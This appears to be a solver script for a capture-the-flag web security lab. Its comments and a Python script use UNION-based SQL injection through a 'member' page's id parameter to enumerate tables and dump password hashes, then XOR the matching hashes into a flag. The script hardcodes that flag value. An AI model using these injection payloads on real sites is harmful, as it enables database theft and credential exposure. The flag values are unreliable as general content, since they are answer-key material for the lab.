# Did: 1 or true -> Just a lot of first names and last names
# 1 UNION SELECT NULL, CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()
# -> clients, users
# 1 UNION SELECT NULL, CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database()
# -> first_namecb, last_namefb, birthdate, emaild7, town1c, country81, comment57, HashedPassword
# -> user_id, first_name, last_name, town, country, planet, Commentaire, countersign
# 1 UNION SELECT NULL, CONCAT(first_namecb, last_namefb, town1c, country81, comment57, HashedPassword) FROM clients
# -> FLAG10 = Xor bitwise all hash passwords in this table that begin with the same two hexadecimal characters as the Cookie Tampering Flag

from collections.abc import Iterable

import requests
from bs4 import BeautifulSoup
from constants import TIMEOUT, URL
from flag_09 import FLAG09


FLAG10 = "00ba3b302b19ab1ca105c181bc5be2abb1623b6d63b072f736a06617680d9359"

INJECTED_URL = (
    f"{URL}/?page=member&id=1+UNION+SELECT+NULL%2C+CONCAT%28HashedPassword%29"
    "+FROM+clients&Submit=Submit#"
)

PREFIX = FLAG09[:2]


def extract_matching_hashes() -> list[str]:
    hashes: list[str] = []
    response = requests.get(INJECTED_URL, timeout=TIMEOUT)

    soup = BeautifulSoup(response.text, "html.parser")
    pres: list[str] = [pre.get_text() for pre in soup.find_all("pre")[1:]]
    soup.decompose()

    for pre in pres:
        elements = pre.rsplit(" : ", 1)
        hash_ = elements[-1]

        if hash_.startswith(PREFIX):
            hashes.append(hash_)

    return hashes


def xor_hashes(hashes: Iterable[str]) -> str:
    result = 0

    for hash_ in hashes:
        result ^= int(hash_, 16)

    return f"{result:064x}"


def main() -> None:
    matching_hashes = extract_matching_hashes()
    flag = xor_hashes(matching_hashes)
    print(flag)


if __name__ == "__main__":
    main()
